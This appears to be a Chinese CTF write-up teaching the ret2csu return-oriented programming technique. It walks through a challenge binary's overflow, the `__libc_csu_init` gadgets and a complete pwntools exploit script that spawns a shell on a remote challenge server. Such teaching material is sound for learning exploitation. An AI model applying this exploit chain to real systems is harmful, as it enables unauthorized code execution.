---
title: Ret2csu
date: 2019-05-22 14:23:00
categories: 
  - Pwn
tags:
  - Pwn
---

# Ret2csu

## 原理

在 glibc 的源码中，有一个函数叫 `__libc_csu_init`，它在程序启动时负责调用 `.init_array` 中的初始化函数

这个函数末尾有一段普适性很强的指令，经常被用作 ROP gadget。安全研究者最早将利用这段代码的技术称为 Return-to-csu，简称 Ret2csu。

因为 `__libc_csu_init` 是 libc 标准启动代码的一部分，只要程序是动态链接的，几乎一定存在，而且在没有 PIE 的情况下地址固定。这给了攻击者在 "找不到常规 pop rdi" 时一个可靠的备胎

## 实战案例

### Pwn题滞销,帮帮我好吗_（Ret2csu）

![](https://pic1.imgdb.cn/item/6a2d8258f684928e3d6bc99a.png)

代码只有两行

![](https://pic1.imgdb.cn/item/6a2d8d9af684928e3d6bdae2.png)

进入 `sub_401132()` 函数，看不出来啥问题

![](https://pic1.imgdb.cn/item/6a2d8da9f684928e3d6bdae3.png)

查看伪代码

```c
push    rbp             ; 保存父函数的栈底（Old RBP）
mov     rbp, rsp        ; 建立当前函数的栈底
sub     rsp, 20h        ; 在栈上只开辟了 0x20（32 字节）的空间

mov     rsi, rsp        ; 参数 2 (buf)：把刚刚开辟的栈顶地址，作为写入数据的起点
mov     rdi, 0          ; 参数 1 (fd)：0 代表标准输入
mov     rdx, 100h       ; 参数 3 (count)：允许读入多达 0x100（256 字节）

mov     rbx, 0          ; \
push    rbx             ; 这三行连招的最终目的：让 RAX = 0
pop     rax             ; /   （0 号系统调用 = sys_read 读入函数）

syscall    ; 触发系统调用

add     rsp, 20h        ; 恢复栈指针，释放之前开辟的 32 字节空间
nop        ; 空指令，用于内存对齐
pop     rbp             ; 恢复父函数栈底
retn       ; 执行返回：弹出栈顶数据到 RIP
```

使用 Pwndbg 动态调试，`pwn cyclic` 生成垃圾数据

![](https://pic1.imgdb.cn/item/6a2d9309f684928e3d6bdb37.png)

`rsi` 寄存器在伪代码中为参数 `buf` 的地址，值为 `0x7fffffffda80`

`rsp` 寄存器指向返回地址，值为 `0x7fffffffdaa8`

我们用这两个真实的动态地址做一下减法，得到要覆盖的垃圾数据为 40 个字节

![](https://pic1.imgdb.cn/item/6a2d9506f684928e3d6bdb4e.png)

因为没有后门，所以我们需要调用 `syscall` 并让系统去执行 `execve("/bin/sh", 0, 0)`

为了启动这个 `syscall`，Linux 规定了死命令，必须提前在寄存器里摆好参数：

- `rax` 寄存器里必须是 59（调用 `execve` 函数）

- `rdi` 寄存器里必须是 `"/bin/sh"` 字符串的内存地址

- `rsi` 寄存器里必须是 0

- `rdx` 寄存器里必须是 0

我们可以利用程序里的残余指令，比如 `pop rdi; ret`。但是查了一遍没给，可惜可惜

![](https://pic1.imgdb.cn/item/6a2dac5df684928e3d6c1026.png)

先来计算 `/bin/sh` 的地址

```
地址        | 字符
--------------------
0x402004   | [
           | !
           | ]
           |  (空格)
           | C
           | a
           | n
           |  (空格)
           | U
           |  (空格)
           | G
           | e
           | t
           |  (空格)
           | t
           | h
           | e
           |  (空格)
--------------------
共计 18 个字符
```

![](https://pic1.imgdb.cn/item/6a2e68e802f2532807685ae1.png)

所以起始地址就是 `0x402016`

虽然常规的 `pop rdi` 没了，但只要是 C 语言编译的程序，系统都会默认自带一个初始化功能，叫 `__libc_csu_init`

在 `__libc_csu_init` 函数的尾部，躺着两段连续的汇编指令

![](https://pic1.imgdb.cn/item/6a2e1e81f684928e3d6d452b.png)

```c
.text:0x4011F2    pop     rbx       ; 弹出给 rbx
.text:0x4011F3    pop     rbp       ; 弹出给 rbp
.text:0x4011F4    pop     r12       ; 弹出给 r12
.text:0x4011F6    pop     r13       ; 弹出给 r13
.text:0x4011F8    pop     r14       ; 弹出给 r14
.text:0x4011FA    pop     r15       ; 弹出给 r15
.text:0x4011FC    retn              ; 弹回栈顶地址继续执行
```

```c
.text:0x4011D8    mov     rdx, r14
.text:0x4011DB    mov     rsi, r13
.text:0x4011DE    mov     edi, r12d
.text:0x4011E1    call    qword ptr [r15+rbx*8]
.text:0x4011E5    add     rbx, 1
.text:0x4011E9    cmp     rbp, rbx
.text:0x4011EC    jnz     short loc_4011D8
```

思路如下：

- `pop rbx`：这里的结果会影响到最后的 `call qword ptr [r15+rbx*8]`，因为 `r15` 本身就由我们控制。选择填 0，这样就直接调用 `r15` 指向的函数

- `pop rbp`：这里的结果会影响到后面的 `cmp rbp, rbx`，再判断之前就已经 `add rbx, 1` 了，所以要填入 1，不然会重新循环

- `pop r12`：这里的结果会影响到后面的 `mov edi, r12d`，`edi` 就是 `rdi`，填入 `/bin/sh` 地址

- `pop r13`：这里的结果会影响到后面的 `mov rsi, r13`，也就是 `execve("/bin/sh", 0, 0)` 第二个参数，填 0

- `pop r14`：同理，这里是第三个参数，填 0

- `pop r15`：这里的结果会影响到后面的 ` call qword ptr [r15+rbx*8]`，因为 `call` 必须得给一个真实的函数地址，否则会报错。我们选择 `alarm`，调用它只是定个闹钟

```python
payload = b'A' * 40              # 垃圾数据填满栈空间
payload += p64(0x4011F2)         # 进入 pop 段
payload += p64(0)                # pop rbx = 0
payload += p64(1)                # pop rbp = 1 (为了 1==1 破循环)
payload += p64(bin_sh)           # pop r12 -> 将送给 edi (参数 1)
payload += p64(0)                # pop r13 -> 将送给 rsi (参数 2)
payload += p64(0)                # pop r14 -> 将送给 rdx (参数 3)
payload += p64(alarm_got)        # pop r15 -> 作为 call 目标
payload += p64(0x4011D8)        # 完成参数搬运与 call
```

到跳转到 `0x4011D8` 处时，执行过程如下

- `rdx` 与 `rsi` 为 0，`rdi` 为 `/bin/sh` 地址

- `call alarm`，`r15` 被填充为了 `alarm` 函数地址

- 比较 `rbp` 和 `rbx`，相等则进去进入 `0x4011EE` 中执行

```c
.text:0x4011EE    add     rsp, 8
.text:0x4011F2    pop     rbx
.text:0x4011F3    pop     rbp
.text:0x4011F4    pop     r12
.text:0x4011F6    pop     r13
.text:0x4011F8    pop     r14
.text:0x4011FA    pop     r15
.text:0x4011FC    retn
```

这样又进入了 `pop` 段中，但是我们已经不需要了，所以填充垃圾数据进去

```python
payload += p64(0) * 7  # 抵消掉这 1 个 add 和 6 个 pop 的干扰
```

此时来到了最后的 `.text:0x4011FC  retn` 处，我们劫持

```python
payload += p64(pop_rax_syscall)
payload += p64(59)
```

```python
from pwn import *

context.arch = 'amd64'
elf = ELF('./main')
io = remote('49.232.142.230', 11962)

gadget_1 = 0x4011F2              # CSU 尾部的 pop 区域入口
gadget_2 = 0x4011D8              # CSU 中部的 mov/call 区域入口
bin_sh_addr = 0x402016           # "/bin/sh" 字符串首地址
alarm_got = elf.got['alarm']     # 闹钟函数的 GOT 真实地址

pop_rax_syscall = 0x401153

payload = b'A' * 40
payload += p64(gadget_1)
payload += p64(0)
payload += p64(1)
payload += p64(bin_sh_addr)
payload += p64(0)
payload += p64(0)
payload += p64(alarm_got)
payload += p64(gadget_2)        

payload += p64(0) * 7           

payload += p64(pop_rax_syscall) 
payload += p64(59)

io.sendline(payload)
io.interactive()
```